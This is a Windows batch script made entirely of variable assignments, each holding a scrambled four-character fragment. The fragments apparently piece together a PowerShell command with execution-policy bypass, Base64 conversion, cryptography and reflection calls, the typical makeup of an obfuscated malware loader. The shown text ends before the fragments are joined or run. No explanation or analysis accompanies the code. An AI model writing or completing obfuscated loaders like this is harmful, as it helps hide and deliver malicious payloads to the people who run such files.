@echo off
set "UvbwbFtPcg=.Dis"
set "hjpuFQqwiC=Lbl "
set "pcKlSNVjUM=vj0m"
set "iNVEFktcGX='gni"
set "ZgKgrpuSbf=oL'["
set "BvzTLnVjSL=O.Su"
set "NbViQgVlyT=$jTA"
set "kogiqkHLJt=S.Pa"
set "uxcBDvmuHC=y.Ci"
set "EIEokjpPLR=6] -"
set "NWzUiZakiZ=7Yiv"
set "WEiFUuXqbD=Conv"
set "XRBWOqcKmD=).Sp"
set "FSaNthlOhT=y.Pa"
set "ODhYYNwsFL=bypa"
set "jkhWgfieuY=)($f"
set "velDApHExB=J = "
set "aUJEbvBGKH=tem."
set "jAiYoLtdYQ=;$eC"
set "ueYlQQbbFk=Obje"
set "wrdjWDAMph=)) {"
set "FSimJxCdRx=flec"
set "NOHTpckDYx=TllA"
set "IuZBByEQWC=[Env"
set "WdcvSSQKBk=ert]"
set "HVpOPrrOQn=ach "
set "WCSlLHMjCS=New-"
set "bJKRmHgFfj=ptor"
set "nCTWdioWSf=[-1."
set "iNZtCGtjkm=]::("
set "WdcDTjPhJd=jTAr"
set "DehXHWkAfA=rt]:"
set "CaErDkEOkx=.-16"
set "khFpjyWPnr=, (,"
set "jRmQsWYhZk=null"
set "aCjULJRccW=tem."
set "YSabTlHWZn=A = "
set "jaDaOhOLBv=ose("
set "uPAHVLKlel=16] "
set "DHrAdAJldN=fore"
set "TxoOzldKaX=raph"
set "vOobrkDlnS=BCHq"
set "UmmUQLXcLy=rg ="
set "JJpNGAqDMX=and "
set "qiwTrlgJZh=EtfF"
set "DPGbVwzGPL= New"
set "odOWYyfUlZ=1] -"
set "bASBaaTNwA=Bmor"
set "TPYeFvKdOi=.Con"
set "ylgnuzssty=);$h"
set "GFyqDbhiVh=am;$"
set "LmNKAkUTyK=ewLi"
set "VLQENDWIdd=ne);"
set "LwyWACbuFu=d;$h"
set "JYENwTdnkv=UCA."
set "hRxrEZQuON=[Sys"
set "oRddFxHMpj=();$"
set "cLmtvuDNEu=TArg"
set "fShPNfRREj=th('"
set "bbgFfFiIDF=Fo7l"
set "iADfupPNun=ionM"
set "jXnribkurU='[-1"
set "fwuJDsnSFP=eCLb"
set "TvtWIDJrda=$hfH"
set "LhWTYPLdTD=[]] "
set "pbKKydPxcs=Syst"
